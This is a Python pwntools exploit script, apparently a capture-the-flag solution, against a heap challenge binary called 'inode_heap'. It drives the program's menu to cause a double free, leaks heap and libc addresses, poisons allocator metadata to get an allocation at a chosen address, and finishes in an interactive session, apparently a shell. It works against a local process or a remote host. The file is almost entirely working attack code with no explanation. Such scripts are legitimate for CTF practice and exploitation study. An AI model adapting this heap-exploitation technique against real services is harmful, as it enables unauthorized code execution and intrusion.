from pwn import *

def cmd(command):
	p.recvuntil("> ")
	p.sendline(str(command))

def alloc(type,num):
	cmd(1)
	p.recvuntil(">")
	p.sendline(str(type))
	p.recvuntil("number:")
	p.sendline(num)
def remove(type):
	cmd(2)
	p.recvuntil(">")
	p.sendline(str(type))
def show(type):
	cmd(3)
	p.recvuntil(">")
	p.sendline(str(type))

def leak():
	p.recvuntil("number :")
	t = p.recvuntil("\n",drop=True)
	if t[0] == '-':
		addr = int(t)+0x100000000
	else:
		addr = int(t)
	return addr

def main(host,port=9005):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./inode_heap")
		# p = process("./",env={"LD_PRELOAD":"./libc.so.6"})
		gdb.attach(p)
    #free arbitrarily
	alloc(2,str(0xff))
	for i in range(0x30):
		alloc(1,str(0x531))
	remove(1)
	alloc(2,str(0xff))
	remove(1)
	show(1)
	heap = leak()
	info("heap : " + hex(heap))
	alloc(1,str((heap&0xfffff000)+0x2c0))
	alloc(1,str(0xff))
	alloc(1,str(0xff))
	remove(1)
	show(1)
	libc = leak()
	info("libc : " + hex(libc))
	alloc(1,str(libc-0x230))
	alloc(2,str(0xff))
	remove(2)
	alloc(1,str(0xffff))
	remove(2)
	alloc(2,str((heap&0xfffff000)+0x2c0))
	alloc(2,str(0xcafe))
	alloc(2,str(0xbabe))
	#!!!
	alloc(2,str(666))
	cmd(4)
	p.interactive()
	
if __name__ == "__main__":
	main(args['REMOTE'])
